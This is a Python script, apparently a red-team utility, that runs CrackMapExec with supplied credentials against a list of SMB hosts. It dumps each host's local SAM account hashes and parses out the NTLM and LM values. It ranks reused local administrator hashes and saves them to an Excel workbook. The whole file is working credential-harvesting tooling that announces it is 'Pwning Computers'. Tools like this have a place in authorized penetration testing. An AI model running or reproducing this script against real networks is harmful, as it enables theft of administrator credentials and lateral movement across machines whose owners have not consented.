import sys
import argparse  # ability to use options
import subprocess  # to call a command line function
import re  # used to create matching expressions
import pandas as pd  # Sweet data analysis tool
from pandas import ExcelWriter  # built-in excel writer


# Example of input used for CME
# 	crack_args = ['/usr/bin/crackmapexec', '-u', 'archer', '-p', 'SomethingLong!', '-d', '.', '/root/Desktop/smb_hosts.txt', '--sam']

# Defining the CrackMapExec Function
def crackMapExec(cme_script):
    crackmap = subprocess.Popen(
        cme_script,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    out, error = crackmap.communicate()
    if len(out) > 0:
        return out
    else:
        return error


def clean_text(text):
    return re.sub(r'\x1b(\[.*?[@-~]|\].*?(\x07|\x1b\\))', '', str(text))


def Create_Excel(file_path):
    with ExcelWriter(file_path) as writer:
        grouping.head(5).to_excel(writer, sheet_name='Top5_Hashes')
        all_data.to_excel(writer, sheet_name='All_Hashes')


# Listing out all of the required arguments
def main():
    parser = argparse.ArgumentParser(add_help=True,
                                     description="A tool created to gather Local Administrative hashes from a list of hosts"
                                                 " and perform a quick analysis on the hashes used across each host.")

    parser.add_argument('-u', help='Username', dest='USERNAME', type=str, required=True)
    parser.add_argument('-p', help='Password', dest='PASSWORD', type=str, required=True)
    parser.add_argument('-d', help="Domain - If local account use a '.'", dest='DOMAIN', type=str, required=True)
    parser.add_argument('-f', help="Host file - Please use the Absolute Path i.e /root/Desktop/hosts.txt", dest='HOSTS',
                        type=str, required=True)
    parser.add_argument('-o',
                        help='Destination to output the Excel file - Use Absolute Path and title i.e /root/Desktop/hashes.xlsx',
                        dest='OUTPUT', type=str)

    args = parser.parse_args()
    User = args.USERNAME
    Passwd = args.PASSWORD
    Domain = args.DOMAIN
    Host_file = args.HOSTS
    Output_path = args.OUTPUT
    return User, Passwd, Domain, Host_file, Output_path


if __name__ == '__main__':
    main()

User, Passwd, Domain, Host_file, Output_path = main()

# Build the argument structure for CrackMapExec
cme = ['/usr/bin/crackmapexec', 'smb', '-u', User, '-p', Passwd, '-d', Domain, Host_file, '--sam']

print('Pwning Computers with the account ' + User + '. Please sit tight')
print('')
# print(crackMapExec(cme))

try:
    # Scrubing the data from CME clean
    clean_data = clean_text(crackMapExec(cme))

    # Creating a list of column headings and an empty list 'dicts', which will be used later
    headers = ['IP_Address', 'Hostname', 'Username', 'rid', 'lm', 'ntlm']
    dicts = []

    # Used to pull hashes then split each part out into a variable
    for line in clean_data.split('\n'):
        if ":::" in line:
            parts = line.split()
            if len(parts) > 3:
                cred = parts[3]
                vcred_parts = cred.split(":")
                if len(vcred_parts) > 3:
                    vusername = vcred_parts[0]
                    vrid = vcred_parts[1]
                    vlm = vcred_parts[2]
                    vntlm = vcred_parts[3].strip()
                    vhostname = parts[2].strip()
                    ipChunk = parts[1]
                    ipParts = ipChunk.split(":")
                    vIp = ipChunk
                    if len(ipParts) > 0:
                        vIp = ipParts[0].strip()

                    # Writing a list of dictionaries using the 'headers' list as the column heading
                    # and then iterating through each variable adding the data for each host to it's own dictionary
                    d = dict(zip(headers, [vIp, vhostname, vusername, vrid, vlm, vntlm]))
                    dicts.append(d)

    # Passing the list of dictionaries into Pandas for analysis
    hashes_df = pd.DataFrame(dicts)
    # Performing a grouping on Username and NTLM hash, then counting how many times it occurs.
    grouping = hashes_df.groupby(['Username', 'ntlm']).ntlm.count().reset_index(name='count').sort_values(['count'],
                                                                                                          ascending=False)
    grouping.set_index('Username', inplace=True)
    # Creating a full table of all Hashes obtained sorting by NTLM and Username
    all_data = hashes_df.sort_values(['ntlm', 'Username'], ascending=False)

    # Rearrange columns to make more sense
    all_data = all_data[['IP_Address', 'Hostname', 'Username', 'rid', 'lm', 'ntlm']]
    all_data.set_index('IP_Address', inplace=True)

    # Printing the Goods
    print('Here lies the Top 5 most used Local Administrator accounts and their Hashes')
    print(grouping.head(5))
    print('')
    # Depending on output flag, excel is put to specific location or where the tool was ran from.
    if Output_path is not None:
        Create_Excel(Output_path)
        print('You can find your Excel file at ' + Output_path)
    else:
        Create_Excel('LA_Hashes.xlsx')
        print("You can find your Excel file at ./LA_Hashes.xlsx")
except Exception as e:
    print("john_local_la.py except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))
